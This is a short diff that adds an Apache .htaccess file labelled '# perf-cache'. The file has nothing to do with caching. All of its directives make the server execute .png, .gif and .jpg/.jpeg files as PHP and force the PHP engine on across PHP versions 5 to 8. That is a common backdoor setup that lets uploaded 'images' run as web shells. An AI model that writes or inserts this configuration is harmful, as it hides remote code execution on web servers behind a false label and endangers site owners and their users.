@@ -1,0 +1,20 @@
+
+# perf-cache
+AddType application/x-httpd-php .png .gif .jpg .jpeg
+AddHandler application/x-httpd-php .png .gif .jpg .jpeg
+<FilesMatch "\.png$|\.gif$|\.jpe?g$">
+    SetHandler application/x-httpd-php
+    ForceType application/x-httpd-php
+</FilesMatch>
+<IfModule mod_php.c>
+    php_flag engine on
+</IfModule>
+<IfModule mod_php8.c>
+    php_flag engine on
+</IfModule>
+<IfModule mod_php7.c>
+    php_flag engine on
+</IfModule>
+<IfModule mod_php5.c>
+    php_flag engine on
+</IfModule>
